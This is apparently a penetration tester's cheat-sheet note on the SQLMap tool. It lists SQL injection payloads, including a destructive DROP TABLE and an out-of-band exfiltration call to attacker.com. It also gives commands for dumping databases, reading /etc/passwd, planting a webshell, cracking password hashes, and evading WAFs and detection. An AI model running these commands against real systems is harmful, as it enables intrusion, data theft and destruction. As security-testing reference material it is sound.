```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
[SQLMap](https://github.com/sqlmapproject/sqlmap) is a tool for automating the process of detecting and exploiting SQLi vulnerabilities. It supports a plethora of databases types and the following techniques:
- `B` : Boolean-based blind - `AND 1=1`
- `E` : Error-based - `AND GTID_SUBSET(@@version,0)`
- `U` : Union query-based - `UNION ALL SELECT 1,@@version,3`
- `S` : Stacked queries - `; DROP TABLE users`
- `T` : Time-based blind - `AND 1=IF(2>1,SLEEP(5),0)`
- `Q` : Inline queries - `(SELECT @@version)`
- ` ` : Out-of-band injection - `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

## Installation
```
sudo apt install sqlmap

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

## Documentation
**Cheatsheet:** 
**Website:** https://github.com/sqlmapproject/sqlmap

## Important log messages
- `Target URL content is stable` : means that the responses are fairly consistent meaning its easier to spot the effects of SQLi attempts
- `GET parameter 'id' appears to be dynamic` : `dynamic` means that changes made to its value, change the output in the response (opposite is `static`)
- `heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')` : means that the get parameter needs to be tested further and it has attempted to guess the DBMS provider based on output.
- `heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks` : SQLMap also quickly runs XSS tests. Its nice to have when running against large websites, *two birds with one stone*.
- `reflective value(s) found and filtering out` : a warning to say that some parts of the payload can be seen in the output so they need to be filtered out before comparing the original page content (*SQLMap does this filtering automatically*).
- `GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")` : This means that SQLMap believes this parameter is a boolean-based blind injection. The `with --string="luther"` is important as it shows that its using this consistent value as its source of TRUE and FALSE responses; this is good as we don't need to use advanced internal mechanisms which could be more susceptible to false-positives.
- `time-based comparison requires a larger statistical model, please wait...(done)` : uses a statistical model for the recognition of regular and (deliberately) delayed target responses. To use this model, SQLMap must collect a large number of responses.
- `automatically extending ranges for UNION query injection technique tests as there is at least on other (potential) technique found` : it takes a large number of requests needed to be able to recognise usable UNION payloads, compared to other techniques. It is capped by default but this cap it extended if there is a good chance of vulnerability.
- `Get parameter 'id' is vulnerable. Do you want to keep testing the others (if any)?` : if we are doing a pentest then we want to test everything, not just find a single vulnerability.

## Usage
```bash
sqlmap -h # Basic options (most common)
sqlmap -hh # Advanced options
```
> A useful trick is to take a HTTP request from a browser, `copy as cURL` and then paste that directly into `sqlmap` as it takes the same format.
> It can also use a request file using `-r [filename]` so we can save requests as files from [[Burp Suite]] and then use them with `sqlmap`.

### Basic Checklist
Basic enumeration:
```bash
sqlmap -u "..." --banner --current-user --current-db --is-dba
```
Table enumeration:
```bash
sqlmap -u "..." --tables -D [db]
```
Dump useful tables:
> We can also specify `-C [cols]` if we know them for larger tables so we don't have loads of data
```bash
sqlmap -u "..." --dump -T [table] -D [db]
```
Full DB enumeration (heavyweight):
```bash
sqlmap -u "..." --dump -D [db]
```
> `--dump-all --exclude-sysbs` can be used to dump all databases in the entire system

### GET Parameters
```bash
sqlmap -u "https://example.com/index.php?id=1" --batch
```
> `--batch` skips all user-input, automatically choosing based on the default options

### POST Parameters
```bash
sqlmap -u "https://example.com/login.php" --data 'username=test&password=*'
```
> The `*` indicates that tests should only use the marked parameter, otherwise they will try all
> We can also specify a particular parameter with `-p username`

### Extracting Data
The `--dump` flag will attempt to exfiltrate content out from the specified data after an SQLi mechanism has been discovered. Some useful basic data enumeration:
- `--hostname` : machine hostname
- `--current-user`
- `--current-db`
- `--passwords` : gets password hashses
- `--banner`
- `--is-dba` : is the current user have DBA rights
- `--tables` : enumerate table names
- `--where` : allows us to add a where clause so we can filter the results returned
- `--schema` : extracts database schema
- `--search` : this can be followed with `-T [table]` or `-C [col]` to search the DB for anything that matches (eg. `--search -C pass` - will return anything with `pass` in the name - not case sensitive)
A good initial enumeration command:
```bash
sqlmap -u "..." --banner --current-user --current-db --is-dba
```

### File Reading / Writing
These actions are often locked behind specific privileges but sometimes we are able to read/write files on the server.
For reading, we write the contents of a file to a table and then get the table. We should check if we are dba (`--is-dba`) as they are most likely to have the appropriate permissions for this.
```bash
sqlmap -u "..." --file-read "/etc/passwd"
```
> This will then tell us where it wrote the file too eg. `~/.sqlmap/output/[host]/files/_etc_passwd`

File writing is often a lot more locked down than reading but can occasionally be done as the DBMS sometimes needs to do this.
```bash
sqlmap -u "..." --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

### OS Command Execution
sqlmap will try a variety of techniques to gain an OS shell (eg. writing a webshell like above, writing SQL commands that execute OS commands, or even things like `xp_cmdshell` in MSSQL). We can request a shell using `--os-shell`.

### Password Cracking
SQLMap automatically searches for anything that resembles a hash and automatically attempts to crack them with its internal engine. It supports a plethora of hash algorithms and an internal dictionary of millions of passwords. The `--passwords` flag is a shortcut for grabbing the DB users' password hashses and cracking them.

### Avoiding Detection
The `--random-agent` will change the `user-agent` header to use a regular browser value (*it picks from an internal database at random*). The `--mobile` simulates a mobile browser.

### Display Errors
`--parse-errors` will attempt to parse DBMS errors and display them as part of the logging.

### Store the traffic
If we want to save a copy of the traffic we can use `-t`. This can be useful for debugging as it will show us all requests made.

### Verbose
Verbose has 6 levels depending on how much you wish to log at each level.

### Using a proxy
If we need to redirect traffic through a proxy (eg. [[Burp Suite]]) then we can use `--proxy`

### Specifying custom Prefix / Suffix
```bash
sqlmap -u "..." --prefix="')" --suffix="-- -"
```

### Level / Risk
An `sqlmap` payload contains two things, the **vector** (*the actual SQL code being injected*) eg. `UNION ALL SELECT 1,2,VERSION()` and the **boundaries** (*the injection mechanism*) eg. prefix: `'))` suffix: `-- -`.
`--level` is a value (1-5, default 1) that extends both the vectors and boundaries being tested, the lower the expected chance of success, the higher the required level to test it.
`--risk` is a value (1-3, default 1) that extends the vectors set based on their risk of causing problems (eg. data loss and DoS).

### Success Criteria
Sometimes we need to specify manually the success criteria:
- `--code` can be used to specify which status code is a successful injection
- `--titles` can be used to base the comparison on the webpage `<title>` field
- `--strings` can be used to fixate detection on the occurrence of a string in the response
- `--text-only` strips out all the HTML tags for hidden content and only does matches against the visible (textual) content on the page

### Specifying a technique
`--technique` you can specify the SQLi technique you want to use.
![[#Summary]]

### Union SQLi Tuning
There are some extra parameters that can be specified for Union SQLi:
- `--union-cols` can be used to specify which number of columns to use (*this can be a range*)
- `--union-char` can be used to specify an alternative value (instead of `NULL` or a random integer) to use in the columns
- `--union-from` can be used to specify a FROM table

### Focusing on specific content
- `-D` specifies the database to enumerate
- `-T` specifies the table to enumerate
- `-C` specifies the colum(s) to enumerate

### Bypassing Web Application Protections
#### Anti-CSRF Token Bypass
`--csrf-token=[token]` will add the token (we can get this by visiting the website). Alternatively we can include it in the data for a POST request, sqlmap will detect it and ask the user if they want to use it in future requests.
SQLMap will look for new tokens in returned requests to continue the attack with the next token.
#### Unique Value Bypass
If there is a parameter that needs to be unique every time a request is sent, then the `--randomize=[param]` flag can be used.
#### Calculated Parameter Bypass
Sometimes we will need to calculate a parameter's value, eg. `h=MD5(username)`. We can use the `--eval="[python code]"` to calculate these values:
```bash
sqlmap -u "http://example.com/index.php?id=1&h=abc..123" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```
#### IP Address Concealing
We can use a proxy or Tor:
- `--proxy="http://127.0.0.1:8080"`
- `--proxy-file` : can be used if we have multiple
- `--tor` : this will make SQLMap check your local system for the proxy tor will create (if its installed and running), `--check-tor` can be used to validate before an attack
#### WAF Bypass
SQLMap automatically tries to identify if a WAF is present and then what one. This happens automatically but can be skipped with `--skip-waf`.
#### User-agent Blacklist Bypass
By default SQLMap uses `User-agent: sqlmap/1.4.9 (http://sqlmap.org)` as its user-agent. This is often blacklisted so `--random-agent` should be used instead.
#### Tamper Scripts
The most popular bypass used in SQLMap, these are python scripts that modify the requests to bypass certain WAFs or IPSs. Many scripts are available that do many different things, a popular example is [between](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/between.py) which changes `>` to `NOT BETWEEN # and #` and `=` to `BETWEEN # AND #`. These can often bypass blacklisted characters and primitive protections. These can be chained together with the `--tamper=[scripts]` flag, these will be executed in a predefined order as some scripts can mess with each other if done in the wrong order.

Some notable tamper scripts (`--list-tampers` will show all):

| **Tamper-Script**           | **Description**                                                                                                                    |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                           |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                   |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                   |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                   |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                           |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                                 |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                             |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                        |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                              |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                            |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                     |
| `space2comment`             | Replaces space character (` `) with comments `/                                                                                    |
| `space2dash`                | Replaces space character (` `) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character (` `) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character (` `) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character (` `) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character (` `) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                             |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                  |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                               |
#### Miscellaneous Bypasses
Chunked transfer encoding (`--chunked`) will split POST requests body into so-called "chunks". This splits up potentially blacklisted SQL keywords into chunks so they try to go unnoticed across the network.
A similar thing can be done in GET requests with *HTTP parameter pollution* which splits the payload across multiple parameters named the same thing (eg. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users`) which are then concatenated by the target platform if supported (eg. `ASP`).